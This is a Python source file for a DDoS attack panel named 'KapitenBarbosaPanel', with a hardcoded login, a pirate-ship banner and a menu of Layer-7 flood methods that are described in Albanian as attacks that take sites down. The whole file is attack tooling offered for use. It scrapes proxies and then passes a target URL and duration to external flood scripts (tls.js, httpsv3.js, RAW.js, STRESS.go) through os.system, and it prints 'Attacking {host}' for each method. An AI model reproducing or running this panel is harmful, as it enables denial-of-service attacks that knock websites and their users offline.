import socket
import os
import requests
import random
import getpass
import time
import sys

print("Wait Scraping Proxy")
os.system("node scrape")
print("Scraping Proxy Success")

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_welcome_message():
    proxys = open('proxy.txt').readlines()
    bots = len(proxys)
    bots_str = str(bots)
    print(f"Welcome To KapitenBarbosaPanel | User: root | Plan: VVIP | Proxy: {bots_str} | Happy To Use")
    print("")

def layer7():
    clear()
    print_welcome_message()
    print('''
        LIST LAYER7 METHODS
        
        TLS - METODA TË FUQISHME TLS [VVIP]
        TLSV1 - METODA SHUMË TË FUQISHME TLS [VVIP]
        HTTPS - NDIHMA E DDoS ME HTTP/1.1 [BASIC]
        HTTPSV2-BYPASS - NDIHMA E DDoS ME HTTP/1.2 [VVIP]
        HTTPSV3 - SULM I RI DDoS ME HTTP/1.3 [VVIP]
        STRESS - SULMON Faqen Deri Në Rënien E Saj
        RAW - METODA TË FUQISHME TLS [VVIP]

        SI TË PËRDORNI
        METODA https://example.com 120         METODA URL KOHA
    ''')

def menu():
    clear()
    print_welcome_message()
    pirate_ship_banner = '''
              __/____            
    _____/______|           
_______/_____|_______\\_____     
\\              ___     _    \\   
 \\_____     __|__|___|_|___|__\\ 
      \\   |__|__|__|__|__|__|__
       \\  |  |  |  |  |  |  |  
        \\_|__|__|__|__|__|__| 
       ~~~  ~~~  ~~~  ~~~  ~~~
      ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
     ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
    '''
    print(pirate_ship_banner)

def execute_command(cnc):
    command_mapping = {
        "layer7": layer7,
        "LAYER7": layer7,
        "L7": layer7,
        "l7": layer7,
        "clear": main,
        "CLEAR": main,
        "CLS": main,
        "cls": main,
    }

    if cnc in command_mapping:
        command_mapping[cnc]()
    elif cnc.startswith("TLS"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(f"Attacking {host} For {time}")
            os.system(f'node tls.js {host} {time} 35 10 proxy.txt')
        except IndexError:
            print('Usage: METHOD URL TIME')
            print('Example: METHOD URL TIME')
    elif cnc.startswith("TLSV1"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(f"Attacking {host} For {time}")
            os.system(f'node tlsv1.js {host} {time} 35 10 proxy.txt')
        except IndexError:
            print('Usage: METHOD URL TIME')
            print('Example: METHOD URL TIME')
    elif cnc.startswith("HTTPSV2"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(f"Attacking {host} For {time}")
            os.system(f'node httpsv2.js {host} {time} 35 10 proxy.txt')
        except IndexError:
            print('Usage: METHOD URL TIME')
            print('Example: METHOD URL TIME')
    elif cnc.startswith("STRESS"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(f"Attacking {host} For {time}")
            os.system(f'go run STRESS.go  --host {host} --time {time}  ')
        except IndexError:
            print('Usage: METHOD URL TIME')
            print('Example: METHOD URL TIME')
    elif cnc.startswith("RAND-REQUEST"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(f"Attacking {host} For {time}")
            os.system(f'node rand {host} {time}')
        except IndexError:
            print('Usage: METHOD URL TIME')
            print('Example: METHOD URL TIME')
    elif cnc.startswith("HTTPSV3"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(f"Attacking {host} For {time}")
            os.system(f'node httpsv3.js {host} {time} 35 50 proxy.txt POST')
        except IndexError:
            print('Usage: METHOD URL TIME')
            print('Example: METHOD URL TIME')
    elif cnc.startswith("RAW"):
        try:
            host, time = cnc.split()[1], cnc.split()[2]
            print(f"Attacking {host} For {time}")
            os.system(f'node RAW.js {host} {time} 100 100 proxy.txt')
        except IndexError:
            print('Usage: METHOD URL TIME')
            print('Example: METHOD URL TIME')
    elif cnc == "help":
        print(''' 
LAYER7 - SEE ALL LAYER7 METHOD
HELP - FOR HELP
CLEAR - CLEAR TERMINAL
''')
    else:
        print(f"Command: [ {cnc.split()[0]} ] Not Found!")

def main():
    menu()
    while True:
        cnc = input("root@Barbosa#~ ")
        execute_command(cnc)

def login():
    clear()
    user = "user"
    passwd = "user"
    username = input("</> Username: ")
    password = getpass.getpass(prompt='</> Password: ')
    if username != user or password != passwd:
        print("Password/Username Error")
        sys.exit(1)
    else:
        print("Welcome To KapitenBarbosa Panel")
        time.sleep(0.3)
        main()

login()
